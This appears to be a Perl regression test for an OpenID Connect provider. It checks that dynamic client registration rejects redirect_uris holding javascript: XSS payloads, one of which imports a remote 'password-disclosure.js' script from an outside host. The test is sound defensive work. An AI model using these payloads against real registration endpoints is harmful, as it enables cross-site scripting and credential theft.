use warnings;
use Test::More;
use strict;
use IO::String;
use LWP::UserAgent;
use LWP::Protocol::PSGI;
use MIME::Base64;
use JSON;

BEGIN {
    require 't/test-lib.pm';
    require 't/oidc-lib.pm';
}

my $res;

# Initialization
ok( my $op = op(), 'OP portal' );

my $register_data = {
    "application_type" => "web",
    "redirect_uris"    => [
        'javascript:confirm(document.domain)',
        'javascript:import("https://xss.lhq.at/password-disclosure.js")'
    ],
    "client_name"                => "My Example",
    "logo_uri"                   => "https://client.example.org/logo.png",
    "subject_type"               => "pairwise",
    "token_endpoint_auth_method" => "client_secret_basic",
};

my $register_data_json = JSON::to_json($register_data);

ok(
    $res = $op->_post(
        "/oauth2/register",
        IO::String->new($register_data_json),
        accept => 'application/json',
        length => length($register_data_json),
    ),
    "Post register data with bad redirect_uris"
);

ok( $res->[0] == 400, "Return code is 400" ) or explain($res->[0], 400);

clean_sessions();
done_testing();

sub op {
    return LLNG::Manager::Test->new( {
            ini => {
                domain                          => 'idp.com',
                portal                          => 'http://auth.op.com/',
                authentication                  => 'Demo',
                userDB                          => 'Same',
                issuerDBOpenIDConnectActivation => 1,
                issuerDBOpenIDConnectRule       => '$uid eq "french"',
                oidcRPMetaDataExportedVars      => {
                    rp => {
                        email       => "mail",
                        family_name => "extract_sn",
                        name        => "cn"
                    }
                },
                oidcServiceDynamicRegistrationExportedVars =>
                  { "extra_var" => "mail" },
                oidcServiceDynamicRegistrationExtraClaims =>
                  { "extra_claim" => "extra_var" },
                oidcServiceAllowHybridFlow            => 1,
                oidcServiceAllowImplicitFlow          => 1,
                oidcServiceAllowDynamicRegistration   => 1,
                oidcServiceAllowAuthorizationCodeFlow => 1,
                oidcRPMetaDataMacros                  => {
                    rp => {
                        extract_sn => '(split(/\s/, $cn))[1]',
                    }
                },
                oidcRPMetaDataOptions => {
                    rp => {
                        oidcRPMetaDataOptionsDisplayName       => "RP",
                        oidcRPMetaDataOptionsIDTokenExpiration => 3600,
                        oidcRPMetaDataOptionsClientID          => "rpid",
                        oidcRPMetaDataOptionsIDTokenSignAlg    => "HS512",
                        oidcRPMetaDataOptionsBypassConsent     => 1,
                        oidcRPMetaDataOptionsClientSecret      => "rpsecret",
                        oidcRPMetaDataOptionsUserIDAttr        => "",
                        oidcRPMetaDataOptionsAccessTokenExpiration => 3600,
                    }
                },
                oidcOPMetaDataOptions           => {},
                oidcOPMetaDataJSON              => {},
                oidcOPMetaDataJWKS              => {},
                oidcServiceMetaDataAuthnContext => {
                    'loa-4' => 4,
                    'loa-1' => 1,
                    'loa-5' => 5,
                    'loa-2' => 2,
                    'loa-3' => 3
                },
                oidcServicePrivateKeySig => oidc_key_op_private_sig,
                oidcServicePublicKeySig  => oidc_cert_op_public_sig,
            }
        }
    );
}

